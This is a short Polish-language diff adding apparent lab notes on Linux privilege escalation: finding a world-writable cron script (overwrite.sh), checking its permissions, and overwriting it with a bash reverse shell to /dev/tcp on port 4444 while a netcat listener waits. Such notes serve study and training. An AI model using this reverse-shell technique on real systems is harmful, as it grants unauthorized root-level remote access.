@@ -1,1 +1,8 @@
-
+Zadania Cron to program lub skrypty,których uruchamianie użytkownicy mogą planować w określonych godzinach lub odstępach czasu. Plik tabel Cron przechowują dla 
+zadań cron. Ogólnosystemowy crontab znaduje się w /etc/crontab
+Pierwszym krokiem będzie znalezienia pełną ścieżkę pliku overwrite.sh.
+locate overwrite.sh | następnie trzeba podać pełną ścieżke pliku i przed tym dodać ls -l i zobaczyć dla kogo jest ten plik zapisywalny.
+I na koniec wystarczyć zrobić sobie revershell 
+#!/bin/bash
+bash -i >& /dev/tcp/eth0/4444 0>&1 | W tym przypadku port 4444 jest opcionalny, można sobie ustawić jaki się chce no i oczywiście przed tą operacją, musimy włączyć
+nasłuchwanie nc -lvnp 4444
